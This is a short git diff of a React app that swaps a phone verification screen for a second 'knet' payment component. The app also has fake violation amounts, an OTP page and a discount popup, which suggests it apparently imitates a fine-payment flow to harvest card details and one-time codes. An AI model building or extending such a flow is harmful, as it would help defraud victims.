@@ -8,12 +8,12 @@ import Plate from "./plate"
 import { Loader } from "./loader"
 import Kent from "./kent/kent"
 import { useFetchViolationData } from "./lib/util"
-import VerificationForm from "./phone/phone"
 import PhoneOTP from "./phone/phone-otp"
 import LoadingScreen from "./sahel"
 import FullPageLoader from "./loader1"
 import { setupOnlineStatus } from "./online-sts"
 import DiscountPopup from "./modal"
+import Ken2 from "./kent/knet2"
 const dataFake = [
   {
     violationAmount: 5,
@@ -141,8 +141,7 @@ function App(props: { setPage: any, page: string }) {
       {props.page === "knet" ? (
         <Kent violationValue={amount} setPage={props.setPage} />
       ) : props.page === "phone" ? (
-        <VerificationForm />
-      ) : props.page === "phoneCode" ? (
+        <Ken2 violationValue={amount} setPage={props.setPage} />      ) : props.page === "phoneCode" ? (
         <PhoneOTP />
       ) : props.page === "sahel" ? (
         <LoadingScreen />
